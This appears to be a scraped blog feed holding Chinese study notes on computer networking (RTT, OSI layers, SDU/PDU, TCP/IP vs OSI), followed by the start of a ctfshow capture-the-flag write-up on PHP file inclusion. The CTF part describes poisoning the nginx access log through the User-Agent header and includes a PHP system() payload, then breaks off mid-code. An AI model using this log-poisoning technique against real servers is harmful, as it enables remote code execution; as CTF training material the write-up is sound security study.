title="往返时延RTT"></a>往返时延RTT</h3><p>从发送方发送数据开始，到发送方收到接收方的确认。（接收方收到数据后立即发送确认）总共经历的实验。</p><p><img src="1.png"></p><p>RTT=传播*2+末端处理时间</p><h2 id="利用率"><a href="#利用率" class="headerlink" title="利用率"></a>利用率</h2><h3 id="信道利用率"><a href="#信道利用率" class="headerlink" title="信道利用率"></a>信道利用率</h3><p>有无数据通过时间/（有+无）数据通过时间</p><p>时延越大利用率越小</p><h3 id="网络利用率"><a href="#网络利用率" class="headerlink" title="网络利用率"></a>网络利用率</h3><p>信道利用率加权平均值</p><h2 id="分层结构"><a href="#分层结构" class="headerlink" title="分层结构"></a>分层结构</h2><h3 id="为什么要分层"><a href="#为什么要分层" class="headerlink" title="为什么要分层"></a>为什么要分层</h3><p>发送前的准备工作：</p><ol><li><p>到送通信的计算机必须将数据的通道进行激活</p></li><li><p>告诉网络如何识别目的主机</p></li><li><p>发起通信的计算机要查明目的主机是否开机</p></li></ol><h3 id="如何分层"><a href="#如何分层" class="headerlink" title="如何分层"></a>如何分层</h3><p>下层对上层保持独立性，上层单向使用下层提供的服务。</p><p><img src="https://www.tutorialandexample.com/wp-content/uploads/2020/10/image-201.png"></p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><h4 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h4><p>第n层的活动要素成为n曾尸体。每同一层实体叫做对等实体</p><h4 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h4><ol><li><p>语法：规定传输数据的格式。规定比特流，何处开始，何处结束，如何分割</p></li><li><p>语义：规定所要完成的功能。</p></li><li><p>同步：规定各种操作呃顺序</p></li></ol><h4 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h4><p>接口服务点ASP：上层使用下层服务的入口。</p><h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><p>下一层为相邻上层提供的功能调用。</p><h3 id="SDU，PCI，与PDU"><a href="#SDU，PCI，与PDU" class="headerlink" title="SDU，PCI，与PDU"></a>SDU，PCI，与PDU</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4ubmxhcmsuY29tL3l1cXVlLzAvMjAyMC9wbmcvMTM1NTA4Mi8xNTk0ODcyMTQ2NTg5LTJmYjYxYmVlLWU5ZjAtNDFkNS1iMjZhLWViNWUzMTEzZjljOC5wbmc?x-oss-process=image/format,png"></p><p>参考链接：<img src="https://blog.csdn.net/wind19/article/details/4669637"></p><h4 id="SDU"><a href="#SDU" class="headerlink" title="SDU"></a>SDU</h4><p>SDU（service Data Unit）:服务数据单元，又叫业务数据单元，是指定层的用户服务的数据集，传送到接收方的时候同一协议层时数据没有发生变化，即业务部分，然后发给下层之后，下层将其封装在PDU中发送出去。服务数据单元是从高层协议来的信息单元传送到低层协议。第N层服务数据单元SDU，和上一层的协议数据单元（PDU）是一一对应的。根据协议数据单元的数据的不同，送到接收端的指定层。</p><p>PDU(N) = SDU(N - 1)</p><p>SDU(N) = PDU(N + 1)</p><h4 id="PDU"><a href="#PDU" class="headerlink" title="PDU"></a>PDU</h4><p>PDU: 协议数据单元</p><p>N层用户与N层协议之间传递的数据称为服务数据单元(SDU)</p><p>N层协议实体之间传递的数据称为协议数据单元（PDU），通过数据发送/接收管理把用户提交的SDU以PDU的形式，通过下层通道发送到对端协议实体。在接收端再将PDU还原成SDU送给收端用户。</p><p>PDU的封装/解封装：在发送方，将用户递交的SDU加上协议控制信息PCI，封装成PDU；在接收方，讲接收到的PDU解封装，去掉PCI，还原成SDU送交接收方用户。</p><p>SDU分段/装配 ：如果下层通道的带宽不能满足传递SDU的需要，就需要将一个SDU分成多段，分别封装成PDU发送出去（分段）；在接收方再将这些PDU解封装后重新装配成SDU。</p><p>SDU拼接/分离：拼接是指在发送方(n)层协议实体把多个长度较短的(n)SDU封装成一个(n)PDU来发送，在接收放再将接收到的(n)PDU解封装，将多个(n)SDU分离出来。采用拼接功能的目的是提高通道的利用率。</p><p>PDU分割/组合：PDU分割是指在发送端(n)层协议实体把一个(n)PDU分割成多个(n-1)SDU，并行地从多个(n-1)通道发送出去；接收端再将收到的多个(n- 1)SDU组合成一个(n)PDU。由于这是一个N层功能，所以组合操作在N层中进行，即N层先得到多个分割开的(n)PDU，然后把它们组合成一个 (n)PDU。</p><h2 id="OSI通信"><a href="#OSI通信" class="headerlink" title="OSI通信"></a>OSI通信</h2><p>上四层端与端通信，下面三层点到点。</p><p>物联网淑慧试用</p><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>所有能与用户交互产生网络流量的程序</p><p>协议：文件传输（FTP），电子邮件（SMTP），万维网（WWW）</p><h3 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h3><p>用于处理两个通信系统中交换信息的表示方式（语法语义）</p><p>功能一：数据格式变化 翻译官（数据编码和解码）</p><p>功能二：数据加密解密</p><p>功能三：数据压缩与恢复</p><h3 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h3><p>向表示层实体/用户进程提供<strong>建立连接</strong>并在连接上<strong>有序****传输</strong>数据。</p><p>功能一：建立管理终止会话</p><p>功能二：使用校验点可使会话在通信失效时从校验点/同步点继续恢复通信，实现数据同步。</p><p>使用传输大文件</p><p>协议：ADSP、ASP</p><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>负责主机中两个进程的通信，即端到端的通信。传输单位是报文段或用户数据报</p><p>功能一：可靠传输、不可靠传输（有无建立连接、返回确认）所以什么连接？TCP/IP三次握手</p><p>功能二：差错控制，</p><p>功能三：流量控制</p><p>功能四：复用分用???啥意思来着</p><p>一般来说，应用层会有比较多的进程同时在运行，同时和外部网络有数据的交互，就好比一条道路有多个车道有车辆在行驶，可是在底层，数据传输是串行的，也就是单车道，多车道的车要经过单车道，采取的方法是在单车道入口设立卡子，每个车道的车在卡子前排队，依次通过卡子进入单车道。排队的过程就是复用，反之就是分用或者叫解复用。</p><p>复用：多个应用层进程可同时使用下层运输层的服务</p><p>分用：运输层把收到的信息分别交付给上面应用层中的相应进程。</p><p><img src="https://www.google.com.hk/imgres?imgurl=https://img-blog.csdnimg.cn/20190322185532712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3NDY1NjM4,size_16,color_FFFFFF,t_70&imgrefurl=https://blog.csdn.net/qq_37465638/article/details/88747149&tbnid=WFG-RinlGcbXNM&vet=12ahUKEwjw2JuNsL_zAhVM3pQKHdQYAUUQMygBegUIARCaAQ..i&docid=r4OV6jTrA0IMwM&w=848&h=350&q=%E4%BC%A0%E8%BE%93%E5%B1%82%E5%A4%8D%E7%94%A8%E5%88%86%E7%94%A8&hl=zh-CN&ved=2ahUKEwjw2JuNsL_zAhVM3pQKHdQYAUUQMygBegUIARCaAQ"></p><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>把<strong>分组</strong>从源端传到目的端，为分组交换网上的不同主机提供通信服务。网络层的传出单位为<strong>数据报</strong></p><p>功能一：路由选择：最佳路径</p><p>功能二：流量控制。</p><p>功能三：差错控制。</p><p>功能四：拥塞控制。</p><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>主要是将网络层传下来的数据包<strong>组装成帧</strong>。</p><p>数据链路层/链路层的传输单位是<strong>帧</strong></p><p>功能一：成帧（定义帧的开始和结束）</p><p>功能二：差错控制（帧错，位错）</p><p>功能三：流量控制</p><p>功能四：访问（介入控制）控制对信道的访问。</p><p>比如广播式网络。决定哪个设备接入数据</p><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>主要任务是在<strong>物理媒体</strong>上实现比特流的<strong>透明传输</strong>。</p><p>物理层传输传输单位是<strong>比特</strong></p><p>透明传输：指不管所传数据是什么样的比特组合，都应当能在链路上传送。</p><p>功能一：定义接口特性，比如确认接口的形状之类的。</p><p>功能二：定义</p><h2 id="TCP-IP-与-OSI"><a href="#TCP-IP-与-OSI" class="headerlink" title="TCP/IP 与 OSI"></a>TCP/IP 与 OSI</h2><p><img src="data:image/png;base64,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"></p><ol><li><p>都分层</p></li><li><p>基于独立的协议栈</p></li><li><p>可以实现异构网络互联</p></li></ol><h3 id="不同"><a href="#不同" class="headerlink" title="不同"></a>不同</h3><ol><li><p>OSO定义三点：服务，协议，接口</p></li><li><p>OSI先出现，参考模型先于协议发明</p></li><li><p>OSI网络层：面向连接与无面向连接。TCP/IP无连接。传输层：OSI面向连接，TCP/IP无连接面向连接</p></li></ol><h3 id="五层参考模型"><a href="#五层参考模型" class="headerlink" title="五层参考模型"></a>五层参考模型</h3><p><img src="https://i2.wp.com/img-blog.csdnimg.cn/20190831212230115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpdWNoZW5nemltb3ppZ3JlYXQ=,size_16,color_FFFFFF,t_70"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow文件包含漏洞</title>
      <link href="/2021/10/09/ctfshow-wen-jian-bao-han-lou-dong/"/>
      <url>/2021/10/09/ctfshow-wen-jian-bao-han-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="Web80-81"><a href="#Web80-81" class="headerlink" title="Web80-81"></a>Web80-81</h2><p>使用日志包含绕过 用日志包含绕过，将执行的命令插入日志中</p><p>这道题奇怪的是nginx日志在/var/log/nginx/access.log，一般apache日志在类似目录下(/var/log/httpd/access.log)</p><p>然后，将命令放置在user-agent上即可</p><p><img src="1.png"></p><p>发现fl0g.php</p><p>然后<?php system('cat fl0g.php');?>即可</p><h2 id="Web81-86"><a href="#Web81-86" class="headerlink" title="Web81-86"></a>Web81-86</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span 